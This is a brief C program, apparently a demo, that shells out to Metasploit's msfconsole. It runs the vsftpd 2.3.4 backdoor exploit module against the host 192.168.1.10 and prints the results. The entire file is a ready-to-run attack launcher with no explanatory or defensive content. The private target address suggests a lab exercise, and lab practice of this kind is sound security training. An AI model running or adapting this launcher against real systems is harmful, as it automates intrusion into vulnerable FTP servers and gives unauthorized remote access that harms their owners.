#include <stdio.h>
#include <stdlib.h>

int main() {

  FILE *fp;
  char buffer[1024];

  printf("\n=== METASPLOIT EXPLOIT DEMO ===\n");

  const char *cmd = "msfconsole -q -x \""
                    "use exploit/unix/ftp/vsftpd_234_backdoor;"
                    "set RHOSTS 192.168.1.10;"
                    "run;"
                    "exit\"";

  printf("Launching metasploit...\n");

  fp = popen(cmd, "r");

  if (fp == NULL) {
    printf("Metasploit execution failed\n");
    return 1;
  }

  while (fgets(buffer, sizeof(buffer), fp) != NULL) {
    printf("%s", buffer);
  }

  pclose(fp);

  printf("\nExploit process completed\n");

  return 0;
}
